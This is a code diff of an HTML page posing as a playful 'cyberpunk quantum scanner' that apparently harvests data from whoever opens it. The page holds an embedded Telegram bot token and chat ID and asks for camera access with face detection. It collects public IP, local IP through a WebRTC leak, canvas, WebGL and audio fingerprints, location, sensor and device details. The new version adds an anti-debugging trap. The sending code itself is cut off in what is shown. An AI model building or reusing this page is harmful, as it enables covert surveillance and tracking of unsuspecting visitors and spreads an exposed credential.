@@ -1,1061 +1,312 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>⚡ CYBERPUNK QUANTUM SCANNER v5.0 - ULTIMATE ⚡</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
-  <style>
-    /* ========== ROOT VARIABLES & CYBERPUNK THEME ========== */
-    :root {
-      --primary: #0ff;
-      --secondary: #f0f;
-      --accent: #ff0;
-      --bg: #0a0a0a;
-      --grid: rgba(0, 255, 255, 0.2);
-      --hologram: rgba(0, 255, 255, 0.1);
-      --scanline: rgba(255, 0, 255, 0.3);
-      --glow: 0 0 15px currentColor;
-    }
-    * {
-      box-sizing: border-box;
-    }
-    body {
-      font-family: 'Courier New', monospace;
-      text-align: center;
-      padding: 20px;
-      background: var(--bg);
-      color: var(--primary);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      position: relative;
-      overflow-x: hidden;
-      background-image: 
-        linear-gradient(var(--grid) 1px, transparent 1px),
-        linear-gradient(90deg, var(--grid) 1px, transparent 1px);
-      background-size: 30px 30px;
-      animation: bgScroll 10s linear infinite;
-    }
-    @keyframes bgScroll {
-      0% { background-position: 0 0; }
-      100% { background-position: 30px 30px; }
-    }
-    .hologram-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      background: radial-gradient(circle at 50% 50%, transparent 0%, var(--bg) 100%);
-      mix-blend-mode: overlay;
-      opacity: 0.3;
-      z-index: 9998;
-      animation: pulseHolo 4s ease-in-out infinite;
-    }
-    @keyframes pulseHolo {
-      0%, 100% { opacity: 0.2; }
-      50% { opacity: 0.4; }
-    }
-    .glitch {
-      text-shadow: 2px 2px var(--secondary), -2px -2px var(--primary);
-      animation: glitch 2s infinite;
-    }
-    @keyframes glitch {
-      0% { transform: translate(0); }
-      20% { transform: translate(-2px, 2px); }
-      40% { transform: translate(2px, -2px); }
-      60% { transform: translate(-1px, 1px); }
-      80% { transform: translate(1px, -1px); }
-      100% { transform: translate(0); }
-    }
-    .scanner-box {
-      position: relative;
-      width: 300px;
-      height: 300px;
-      margin: 20px auto;
-      overflow: hidden;
-      border: 2px solid var(--primary);
-      box-shadow: 0 0 30px var(--primary);
-      border-radius: 10px;
-    }
-    .scanner-box video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-    .scanner-line {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 2px;
-      background: linear-gradient(to right, transparent, var(--primary), transparent);
-      animation: scanLine 2s linear infinite;
-      z-index: 2;
-      box-shadow: 0 0 10px var(--primary);
-    }
-    @keyframes scanLine {
-      0% { top: 0; }
-      100% { top: 100%; }
-    }
-    #radarCanvas {
-      width: 200px;
-      height: 200px;
-      border-radius: 50%;
-      border: 2px solid var(--primary);
-      box-shadow: 0 0 20px var(--primary);
-      margin: 10px auto;
-    }
-    #scan-progress-container {
-      width: 80%;
-      height: 20px;
-      background: #111;
-      border: 1px solid var(--primary);
-      border-radius: 10px;
-      margin: 15px auto;
-      overflow: hidden;
-      box-shadow: inset 0 0 5px #000, 0 0 10px var(--primary);
-    }
-    #scan-progress-fill {
-      width: 0%;
-      height: 100%;
-      background: linear-gradient(90deg, var(--primary), var(--secondary));
-      transition: width 0.3s;
-    }
-    .dashboard {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-      gap: 15px;
-      width: 100%;
-      max-width: 1400px;
-      margin: 20px 0;
-    }
-    .card {
-      background: rgba(0, 0, 0, 0.7);
-      border: 1px solid var(--primary);
-      border-radius: 10px;
-      padding: 15px;
-      backdrop-filter: blur(5px);
-      box-shadow: 0 0 20px var(--primary);
-      text-align: left;
-      max-height: 400px;
-      overflow-y: auto;
-    }
-    .card h3 {
-      margin-top: 0;
-      color: var(--secondary);
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      border-bottom: 1px solid var(--primary);
-      padding-bottom: 5px;
-      position: sticky;
-      top: 0;
-      background: rgba(0,0,0,0.8);
-    }
-    .info-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 5px 0;
-      border-bottom: 1px dotted var(--primary);
-      font-size: 0.9rem;
-    }
-    .info-label {
-      color: var(--accent);
-    }
-    .info-value {
-      font-weight: bold;
-      text-align: right;
-      word-break: break-word;
-      max-width: 60%;
-    }
-    button {
-      background: transparent;
-      border: 2px solid var(--primary);
-      color: var(--primary);
-      padding: 12px 24px;
-      font-size: 1.2rem;
-      font-family: 'Courier New', monospace;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      cursor: pointer;
-      margin: 15px;
-      border-radius: 5px;
-      box-shadow: 0 0 15px var(--primary);
-      transition: 0.2s;
-      animation: pulseBtn 1.5s infinite;
-    }
-    button:hover {
-      background: var(--primary);
-      color: #000;
-      box-shadow: 0 0 30px var(--primary);
-    }
-    @keyframes pulseBtn {
-      0% { opacity: 0.8; }
-      50% { opacity: 1; transform: scale(1.02); }
-      100% { opacity: 0.8; }
-    }
-    #loading {
-      color: var(--secondary);
-      animation: blink 1s step-end infinite;
-    }
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
-    }
-    .hologram-effect {
-      position: fixed;
-      width: 200%;
-      height: 200%;
-      background: linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%), linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%), linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%), linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
-      background-size: 20px 20px;
-      pointer-events: none;
-      mix-blend-mode: overlay;
-      opacity: 0.3;
-      z-index: 9999;
-      animation: hologram 20s linear infinite;
-    }
-    @keyframes hologram {
-      from { transform: translate(-50%, -50%) rotate(0deg); }
-      to { transform: translate(-50%, -50%) rotate(360deg); }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>⚡ CYBERPUNK QUANTUM SCANNER v6.0 - PHANTOM ⚡</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+    <style>
+        :root {
+            --primary: #0ff;
+            --secondary: #f0f;
+            --accent: #ff0;
+            --bg: #050505;
+            --grid: rgba(0, 255, 255, 0.15);
+            --glow: 0 0 15px var(--primary);
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: var(--bg);
+            color: var(--primary);
+            margin: 0;
+            overflow-x: hidden;
+            background-image: linear-gradient(var(--grid) 1px, transparent 1px), 
+                              linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+            background-size: 40px 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* --- Hologram & Glitch --- */
+        .scanline {
+            width: 100%; height: 100px;
+            background: linear-gradient(0deg, transparent, var(--secondary), transparent);
+            position: fixed; top: -100px; left: 0;
+            opacity: 0.1; z-index: 9999; pointer-events: none;
+            animation: scanLoop 4s linear infinite;
+        }
+        @keyframes scanLoop { 0% { top: -100px; } 100% { top: 100%; } }
+
+        .header { margin: 20px; text-align: center; }
+        .glitch-text {
+            font-size: 1.8rem;
+            text-transform: uppercase;
+            text-shadow: 2px 0 var(--secondary), -2px 0 var(--primary);
+            animation: glitch 1s infinite alternate;
+        }
+        @keyframes glitch {
+            0% { transform: skew(0.5deg); }
+            100% { transform: skew(-0.5deg); }
+        }
+
+        /* --- Scanner Elements --- */
+        .main-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            padding: 20px;
+            width: 100%;
+            max-width: 1400px;
+        }
+
+        .view-port {
+            position: relative;
+            width: 320px;
+            height: 320px;
+            border: 3px solid var(--primary);
+            box-shadow: var(--glow);
+            background: #000;
+        }
+        #video { width: 100%; height: 100%; object-fit: cover; }
+        .target-overlay {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%; height: 80%;
+            border: 1px solid rgba(0, 255, 255, 0.5);
+            pointer-events: none;
+        }
+
+        /* --- Progress Bar --- */
+        .progress-wrapper { width: 90%; max-width: 600px; margin: 20px 0; }
+        .bar-container {
+            height: 10px; background: #111;
+            border: 1px solid var(--primary);
+            border-radius: 5px; overflow: hidden;
+        }
+        #progress-fill { width: 0%; height: 100%; background: var(--secondary); transition: 0.1s; }
+
+        /* --- Dashboard Grid --- */
+        .dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 15px; width: 100%;
+        }
+        .card {
+            background: rgba(0,0,0,0.8);
+            border: 1px solid var(--primary);
+            padding: 15px;
+            font-size: 0.85rem;
+            position: relative;
+        }
+        .card h3 { 
+            color: var(--secondary); margin-top: 0; font-size: 1rem; 
+            border-bottom: 1px solid var(--primary); padding-bottom: 5px;
+        }
+        .info-row { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid rgba(0,255,255,0.1); }
+        .label { color: var(--accent); }
+
+        /* --- Terminal Log --- */
+        #log-stream {
+            position: fixed; bottom: 0; left: 0; width: 100%;
+            background: rgba(0,0,0,0.9); height: 100px;
+            overflow-y: auto; padding: 10px; font-size: 0.75rem;
+            border-top: 2px solid var(--secondary);
+            color: #0f0; z-index: 100;
+        }
+
+        button {
+            background: transparent; border: 2px solid var(--primary);
+            color: var(--primary); padding: 15px 30px; cursor: pointer;
+            font-family: inherit; font-weight: bold; font-size: 1.1rem;
+            transition: 0.3s; margin-top: 10px;
+        }
+        button:hover { background: var(--primary); color: #000; box-shadow: var(--glow); }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    </style>
 </head>
 <body>
-  <div class="hologram-overlay"></div>
-  <div class="hologram-effect"></div>
 
-  <h1 class="glitch">🛸 ULTIMATE CYBERPUNK SCANNER v5.0 🛸</h1>
+<div class="scanline"></div>
 
-  <div class="scanner-box">
-    <div class="scanner-line"></div>
-    <video id="video" autoplay playsinline muted></video>
-  </div>
+<div class="header">
+    <h1 class="glitch-text">Quantum Scanner v6.0</h1>
+    <p id="status">STATUS: SYSTEM READY...</p>
+</div>
 
-  <canvas id="radarCanvas" width="200" height="200"></canvas>
+<div class="main-container">
+    <div class="view-port">
+        <video id="video" autoplay playsinline muted></video>
+        <div class="target-overlay"></div>
+        <canvas id="face-canvas" style="position:absolute; top:0; left:0;"></canvas>
+    </div>
 
-  <div id="scan-progress-container">
-    <div id="scan-progress-fill"></div>
-  </div>
+    <div class="dashboard" id="dashboard">
+        <div class="card">
+            <h3>🆔 IDENTITY MASK</h3>
+            <div class="info-row"><span class="label">OS</span><span id="os">Scanning...</span></div>
+            <div class="info-row"><span class="label">Browser</span><span id="br">Scanning...</span></div>
+            <div class="info-row"><span class="label">Public IP</span><span id="ip">Scanning...</span></div>
+            <div class="info-row"><span class="label">Local IP</span><span id="lip">Scanning...</span></div>
+        </div>
+        <div class="card">
+            <h3>🧠 BIOMETRICS</h3>
+            <div class="info-row"><span class="label">Mood</span><span id="mood">N/A</span></div>
+            <div class="info-row"><span class="label">CPU Logic</span><span id="cpu">N/A</span></div>
+            <div class="info-row"><span class="label">Memory</span><span id="ram">N/A</span></div>
+        </div>
+        <div class="card">
+            <h3>🔒 SECURITY</h3>
+            <div class="info-row"><span class="label">VPN Probable</span><span id="vpn">N/A</span></div>
+            <div class="info-row"><span class="label">DevTools</span><span id="dev">CLEAN</span></div>
+            <div class="info-row"><span class="label">Incognito</span><span id="inc">Scanning...</span></div>
+        </div>
+    </div>
+</div>
 
-  <button id="capture-btn">🚀 INITIATE DEEP SCAN</button>
-  <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE...</div>
+<div class="progress-wrapper">
+    <div class="bar-container"><div id="progress-fill"></div></div>
+</div>
 
-  <!-- DASHBOARD SUPER LENGKAP -->
-  <div class="dashboard">
-    <!-- CARD 1: Device Matrix (existing) -->
-    <div class="card">
-      <h3>⚙️ DEVICE MATRIX</h3>
-      <div id="device-info-content"></div>
-    </div>
-    <!-- CARD 2: CPU & Memory -->
-    <div class="card">
-      <h3>🧠 CPU & MEMORY</h3>
-      <div class="info-row"><span class="info-label">CPU Cores</span><span id="cpu-cores" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Architecture</span><span id="cpu-arch" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">SIMD Support</span><span id="simd" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Throttling Score</span><span id="throttling" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Used Heap (MB)</span><span id="used-heap" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Total Heap (MB)</span><span id="total-heap" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Heap Limit (MB)</span><span id="heap-limit" class="info-value">N/A</span></div>
-    </div>
-    <!-- CARD 3: GPU & Graphics -->
-    <div class="card">
-      <h3>🎮 GRAPHICS</h3>
-      <div class="info-row"><span class="info-label">GPU Vendor</span><span id="gpu-vendor" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">GPU Renderer</span><span id="gpu-renderer" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">WebGL Version</span><span id="webgl-version" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">WebGL Extensions</span><span id="webgl-ext" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">WebGPU</span><span id="webgpu" class="info-value">❌</span></div>
-    </div>
-    <!-- CARD 4: Display & Screen -->
-    <div class="card">
-      <h3>🖥️ DISPLAY</h3>
-      <div class="info-row"><span class="info-label">Refresh Rate (Hz)</span><span id="refresh-rate" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Color Depth</span><span id="color-depth" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Pixel Depth</span><span id="pixel-depth" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">HDR Support</span><span id="hdr" class="info-value">❌</span></div>
-      <div class="info-row"><span class="info-label">Color Gamut</span><span id="gamut" class="info-value">N/A</span></div>
-    </div>
-    <!-- CARD 5: Battery & Power -->
-    <div class="card">
-      <h3>🔋 BATTERY</h3>
-      <div class="info-row"><span class="info-label">Level</span><span id="battery-level" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Charging</span><span id="battery-charging" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Discharging Time</span><span id="discharge-time" class="info-value">N/A</span></div>
-    </div>
-    <!-- CARD 6: Storage -->
-    <div class="card">
-      <h3>💾 STORAGE</h3>
-      <div class="info-row"><span class="info-label">Quota (MB)</span><span id="quota" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Usage (MB)</span><span id="usage" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Persistent</span><span id="persistent" class="info-value">N/A</span></div>
-    </div>
-    <!-- CARD 7: Audio -->
-    <div class="card">
-      <h3>🎵 AUDIO</h3>
-      <div class="info-row"><span class="info-label">Sample Rate</span><span id="sample-rate" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Audio Codecs</span><span id="audio-codecs" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Latency (ms)</span><span id="audio-latency" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Output Devices</span><span id="audio-out" class="info-value">N/A</span></div>
-    </div>
-    <!-- CARD 8: Camera -->
-    <div class="card">
-      <h3>📷 CAMERA</h3>
-      <div class="info-row"><span class="info-label">Max Resolution</span><span id="cam-res" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Frame Rate</span><span id="cam-fps" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Torch Supported</span><span id="cam-torch" class="info-value">❌</span></div>
-    </div>
-    <!-- CARD 9: Sensors Real-time -->
-    <div class="card">
-      <h3>📳 SENSORS (LIVE)</h3>
-      <div class="info-row"><span class="info-label">Accel X</span><span id="accel-x" class="info-value">0</span></div>
-      <div class="info-row"><span class="info-label">Accel Y</span><span id="accel-y" class="info-value">0</span></div>
-      <div class="info-row"><span class="info-label">Accel Z</span><span id="accel-z" class="info-value">0</span></div>
-      <div class="info-row"><span class="info-label">Rotation α</span><span id="rot-alpha" class="info-value">0</span></div>
-      <div class="info-row"><span class="info-label">Rotation β</span><span id="rot-beta" class="info-value">0</span></div>
-      <div class="info-row"><span class="info-label">Rotation γ</span><span id="rot-gamma" class="info-value">0</span></div>
-    </div>
-    <!-- CARD 10: Network & IP -->
-    <div class="card">
-      <h3>🌐 NETWORK DEEP</h3>
-      <div class="info-row"><span class="info-label">Public IP</span><span id="public-ip" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Local IP</span><span id="local-ip" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">VPN Detected</span><span id="vpn" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Jitter (ms)</span><span id="jitter" class="info-value">N/A</span></div>
-    </div>
-    <!-- CARD 11: Fingerprint & Identitas -->
-    <div class="card">
-      <h3>🆔 FINGERPRINT</h3>
-      <div class="info-row"><span class="info-label">Canvas FP</span><span id="canvas-fp" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">WebGL FP</span><span id="webgl-fp" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Audio FP</span><span id="audio-fp" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Fonts Installed</span><span id="fonts" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Unique Hash</span><span id="unique-hash" class="info-value">N/A</span></div>
-    </div>
-    <!-- CARD 12: Keamanan & Privasi -->
-    <div class="card">
-      <h3>🔒 SECURITY</h3>
-      <div class="info-row"><span class="info-label">Do Not Track</span><span id="dnt" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">3rd Party Cookies</span><span id="third-cookies" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">AdBlocker</span><span id="adblock" class="info-value">❌</span></div>
-      <div class="info-row"><span class="info-label">TLS Version</span><span id="tls" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">HSTS</span><span id="hsts" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">VM Detected</span><span id="vm" class="info-value">N/A</span></div>
-    </div>
-    <!-- CARD 13: Lokasi -->
-    <div class="card">
-      <h3>📍 LOCATION</h3>
-      <div class="info-row"><span class="info-label">Lat/Lon</span><span id="loc-coords" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Accuracy (m)</span><span id="loc-acc" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Altitude (m)</span><span id="loc-alt" class="info-value">N/A</span></div>
-      <div class="info-row"><span class="info-label">Speed (m/s)</span><span id="loc-speed" class="info-value">N/A</span></div>
-    </div>
-  </div>
+<button id="scan-btn">INITIATE PHANTOM SCAN</button>
 
-  <script>
-    // ========== KONFIGURASI TELEGRAM ==========
+<div id="log-stream">Initializing core kernels...</div>
+
+<script>
+    // --- KONFIGURASI ---
     const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
     const CHAT_ID = '1121369247';
-    let currentStream = null;
-    let isScanning = false;
-    const video = document.getElementById('video');
-    const loading = document.getElementById('loading');
-    const progressFill = document.getElementById('scan-progress-fill');
+    
+    const btn = document.getElementById('scan-btn');
+    const fill = document.getElementById('progress-fill');
+    const log = document.getElementById('log-stream');
 
-    // ========== ELEMEN UI ==========
-    const deviceInfoContent = document.getElementById('device-info-content');
-    // ... (semua elemen akan di-set melalui id) kita akan akses nanti
-
-    // ========== RADAR ==========
-    const radarCanvas = document.getElementById('radarCanvas');
-    const ctxRadar = radarCanvas.getContext('2d');
-    function drawRadar() {
-      const w = 200, h = 200;
-      ctxRadar.clearRect(0, 0, w, h);
-      ctxRadar.strokeStyle = '#0ff';
-      ctxRadar.lineWidth = 1;
-      ctxRadar.beginPath();
-      ctxRadar.arc(100, 100, 80, 0, 2 * Math.PI);
-      ctxRadar.stroke();
-      ctxRadar.beginPath();
-      ctxRadar.arc(100, 100, 50, 0, 2 * Math.PI);
-      ctxRadar.stroke();
-      ctxRadar.beginPath();
-      ctxRadar.arc(100, 100, 20, 0, 2 * Math.PI);
-      ctxRadar.stroke();
-      ctxRadar.beginPath();
-      ctxRadar.moveTo(100, 20);
-      ctxRadar.lineTo(100, 180);
-      ctxRadar.stroke();
-      ctxRadar.beginPath();
-      ctxRadar.moveTo(20, 100);
-      ctxRadar.lineTo(180, 100);
-      ctxRadar.stroke();
-      let angle = (Date.now() / 500) % (2 * Math.PI);
-      ctxRadar.beginPath();
-      ctxRadar.moveTo(100, 100);
-      ctxRadar.lineTo(100 + 80 * Math.cos(angle), 100 + 80 * Math.sin(angle));
-      ctxRadar.strokeStyle = '#f0f';
-      ctxRadar.lineWidth = 2;
-      ctxRadar.stroke();
-      ctxRadar.fillStyle = '#ff0';
-      for (let i=0; i<5; i++) {
-        let x = 100 + Math.sin(i*2+Date.now()/1000)*40;
-        let y = 100 + Math.cos(i*3+Date.now()/800)*40;
-        ctxRadar.beginPath();
-        ctxRadar.arc(x, y, 3, 0, 2*Math.PI);
-        ctxRadar.fill();
-      }
-      requestAnimationFrame(drawRadar);
-    }
-    drawRadar();
-
-    // ========== FUNGSI-FUNGSI DETEKSI LANJUTAN ==========
-
-    // Deteksi arsitektur 32/64 bit
-    function detectArch() {
-      const ua = navigator.userAgent;
-      if (ua.indexOf('WOW64') > -1 || ua.indexOf('Win64') > -1 || ua.indexOf('x86_64') > -1 || ua.indexOf('x64') > -1) return '64-bit';
-      else return '32-bit';
+    function pushLog(msg) {
+        const div = document.createElement('div');
+        div.innerText = `> [${new Date().toLocaleTimeString()}] ${msg}`;
+        log.prepend(div);
     }
 
-    // Deteksi SIMD (via WebAssembly)
-    function detectSIMD() {
-      try {
-        return WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,123,3,2,1,0,10,10,1,8,0,65,0,253,15,253,98,11])); // v128 simd test
-      } catch { return false; }
-    }
-
-    // CPU throttling test (benchmark berulang)
-    async function cpuThrottlingScore() {
-      return new Promise(resolve => {
-        let results = [];
-        for (let t = 0; t < 3; t++) {
-          let start = performance.now();
-          for (let i = 0; i < 5e6; i++) Math.sqrt(i);
-          let end = performance.now();
-          results.push(end - start);
+    // --- DETEKSI KEAMANAN (ANTI-DEBUG) ---
+    setInterval(() => {
+        const start = performance.now();
+        debugger; // Trigger jika DevTools terbuka
+        if (performance.now() - start > 100) {
+            document.getElementById('dev').innerText = "DETECTED";
+            document.getElementById('dev').style.color = "red";
+            pushLog("WARNING: External debugger detected!");
         }
-        let avg = results.reduce((a,b)=>a+b,0)/results.length;
-        let score = Math.round(10000 / avg); // semakin tinggi semakin baik
-        resolve(score);
-      });
-    }
+    }, 2000);
 
-    // Memori Chrome-specific
-    function getHeapInfo() {
-      if (performance.memory) {
-        return {
-          usedJSHeapSize: (performance.memory.usedJSHeapSize / 1048576).toFixed(2),
-          totalJSHeapSize: (performance.memory.totalJSHeapSize / 1048576).toFixed(2),
-          jsHeapSizeLimit: (performance.memory.jsHeapSizeLimit / 1048576).toFixed(2)
-        };
-      }
-      return { usedJSHeapSize: 'N/A', totalJSHeapSize: 'N/A', jsHeapSizeLimit: 'N/A' };
-    }
-
-    // WebGL version & extensions
-    function getWebGLInfo() {
-      let info = { version: 'N/A', extensions: [], renderer: 'N/A', vendor: 'N/A' };
-      try {
-        const canvas = document.createElement('canvas');
-        let gl = canvas.getContext('webgl2');
-        if (gl) info.version = 'WebGL 2.0';
-        else {
-          gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-          if (gl) info.version = 'WebGL 1.0';
-        }
-        if (gl) {
-          const debug = gl.getExtension('WEBGL_debug_renderer_info');
-          if (debug) {
-            info.vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-            info.renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-          }
-          info.extensions = gl.getSupportedExtensions().slice(0, 10); // ambil 10 pertama saja
-        }
-      } catch (e) {}
-      return info;
-    }
-
-    // WebGPU detection
-    function detectWebGPU() {
-      return 'gpu' in navigator;
-    }
-
-    // Refresh rate
-    function detectRefreshRate() {
-      return new Promise(resolve => {
-        let last = performance.now();
-        let frames = 0;
-        function count() {
-          frames++;
-          let now = performance.now();
-          if (now - last < 1000) requestAnimationFrame(count);
-          else {
-            resolve(Math.round(frames));
-          }
-        }
-        requestAnimationFrame(count);
-      });
-    }
-
-    // HDR & Gamut
-    function detectHDR() {
-      return window.matchMedia('(dynamic-range: high)').matches ? '✅' : '❌';
-    }
-    function detectGamut() {
-      if (window.matchMedia('(color-gamut: p3)').matches) return 'P3';
-      if (window.matchMedia('(color-gamut: rec2020)').matches) return 'Rec2020';
-      if (window.matchMedia('(color-gamut: srgb)').matches) return 'sRGB';
-      return 'Unknown';
-    }
-
-    // Audio sample rate & latency
-    async function getAudioInfo() {
-      let info = { sampleRate: 'N/A', latency: 'N/A', codecs: [], devices: [] };
-      try {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        info.sampleRate = audioCtx.sampleRate + ' Hz';
-        // latency (estimate)
-        let start = performance.now();
-        let oscillator = audioCtx.createOscillator();
-        oscillator.connect(audioCtx.destination);
-        oscillator.start();
-        oscillator.stop(0.01);
-        // Tunggu sebentar
-        await new Promise(r => setTimeout(r, 50));
-        info.latency = (performance.now() - start - 50).toFixed(2) + ' ms';
-        // codec support
-        const types = ['audio/mp4;codecs="mp4a.40.2"', 'audio/webm;codecs="opus"', 'audio/webm;codecs="vorbis"'];
-        info.codecs = types.filter(t => MediaRecorder.isTypeSupported(t)).map(t => t.split(';')[0]);
-      } catch (e) {}
-      try {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        info.devices = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'unknown');
-      } catch (e) {}
-      return info;
-    }
-
-    // Camera capabilities
-    async function getCameraInfo() {
-      let info = { maxRes: 'N/A', fps: 'N/A', torch: false };
-      if (currentStream) {
-        const track = currentStream.getVideoTracks()[0];
-        if (track) {
-          const caps = track.getCapabilities ? track.getCapabilities() : {};
-          const settings = track.getSettings();
-          if (caps.width && caps.height) info.maxRes = `${caps.width.max}x${caps.height.max}`;
-          else if (settings.width && settings.height) info.maxRes = `${settings.width}x${settings.height}`;
-          if (caps.frameRate) info.fps = caps.frameRate.max;
-          info.torch = !!caps.torch;
-        }
-      }
-      return info;
-    }
-
-    // Sensor real-time
-    function initSensors() {
-      window.addEventListener('devicemotion', e => {
-        if (e.acceleration) {
-          document.getElementById('accel-x').innerText = e.acceleration.x?.toFixed(2) || 0;
-          document.getElementById('accel-y').innerText = e.acceleration.y?.toFixed(2) || 0;
-          document.getElementById('accel-z').innerText = e.acceleration.z?.toFixed(2) || 0;
-        }
-      });
-      window.addEventListener('deviceorientation', e => {
-        document.getElementById('rot-alpha').innerText = e.alpha?.toFixed(2) || 0;
-        document.getElementById('rot-beta').innerText = e.beta?.toFixed(2) || 0;
-        document.getElementById('rot-gamma').innerText = e.gamma?.toFixed(2) || 0;
-      });
-    }
-    initSensors();
-
-    // Local IP (via WebRTC)
-    function getLocalIP() {
-      return new Promise(resolve => {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = ice => {
-          if (!ice || !ice.candidate) return;
-          const ip = ice.candidate.address || ice.candidate.ip; // format berbeda
-          if (ip && ip.match(/\d+\.\d+\.\d+\.\d+/)) {
-            resolve(ip);
-            pc.close();
-          }
-        };
-        setTimeout(() => resolve('N/A'), 3000);
-      });
-    }
-
-    // VPN detection (sederhana: bandingkan timezone dan IP publik? sulit, kita gunakan deteksi berdasarkan perbedaan IP lokal dan publik)
-    async function detectVPN(publicIP, localIP) {
-      if (!publicIP || publicIP === 'Unknown' || !localIP || localIP === 'N/A') return 'Unknown';
-      // Jika IP publik dan lokal berbeda kelas? misal lokal 192.168.x.x dan publik bukan, itu wajar. VPN biasanya IP publik berbeda negara.
-      // Untuk sederhana, kita cek apakah localIP termasuk private range
-      const isPrivate = /^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/.test(localIP);
-      if (!isPrivate) return 'Possible VPN'; // jika lokal IP tidak private, mungkin VPN
-      return 'Likely No VPN';
-    }
-
-    // Jitter test
-    async function measureJitter() {
-      let times = [];
-      for (let i = 0; i < 5; i++) {
-        let start = performance.now();
-        try { await fetch('https://www.google.com/favicon.ico?cache=' + Date.now(), { mode: 'no-cors' }); } catch {}
-        times.push(performance.now() - start);
-      }
-      let avg = times.reduce((a,b)=>a+b,0)/times.length;
-      let jitter = Math.sqrt(times.map(t => Math.pow(t-avg,2)).reduce((a,b)=>a+b,0)/times.length).toFixed(2);
-      return jitter + ' ms';
-    }
-
-    // Canvas fingerprint
-    function getCanvasFP() {
-      const canvas = document.createElement('canvas');
-      canvas.width = 200; canvas.height = 50;
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = 'top';
-      ctx.font = '14px Arial';
-      ctx.fillStyle = '#f60';
-      ctx.fillRect(0,0,200,50);
-      ctx.fillStyle = '#fff';
-      ctx.fillText('Hello, world!', 10, 10);
-      return canvas.toDataURL().slice(0, 100); // ambil sebagian untuk hash
